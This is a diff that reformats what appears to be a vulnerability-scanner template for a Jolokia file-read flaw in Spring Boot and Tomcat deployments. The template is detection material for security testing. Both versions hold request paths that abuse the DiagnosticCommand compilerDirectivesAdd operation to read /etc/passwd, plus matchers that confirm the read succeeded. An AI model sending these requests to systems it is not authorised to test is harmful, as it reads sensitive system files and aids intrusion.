@@ -1,5 +1,4 @@
 id: jolokia-file-read-compilerdirectivesadd
-
 info:
   name: Jolokia - CompilerDirectivesAdd File Read
   author: dhiyaneshDk
@@ -11,28 +10,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
     cvss-score: 8.3
-    cwe-id: CWE-522
+    cwe-id: CWE-22,CWE-522,CWE-73
   metadata:
     max-request: 2
-  tags: jolokia,springboot,tomcat,lfi,misconfig,vuln
-
+  tags: jolokia,lfi,misconfig,springboot,tomcat,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
-      - "{{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
-
-    stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: regex
+  - matchers:
+      - condition: and
         regex:
-          - "root:.*:0:0:"
-          - "compilerDirectivesAdd"
-        condition: and
-
-      - type: status
-        status:
+          - 'root:.*:0:0:'
+          - compilerDirectivesAdd
+        type: regex
+      - status:
           - 200
-# digest: 4b0a00483046022100a06052f2a7af618afd13a316890a39c0a4b0b13ee4979945e9a19a271ccecdb6022100a680d253c071cc89b033afdbfe693fcb86d7cc07e39d1d70e2de414d0669323a:922c64590222798bb761d5b6d8e72950
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
+      - '{{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
+    stop-at-first-match: true
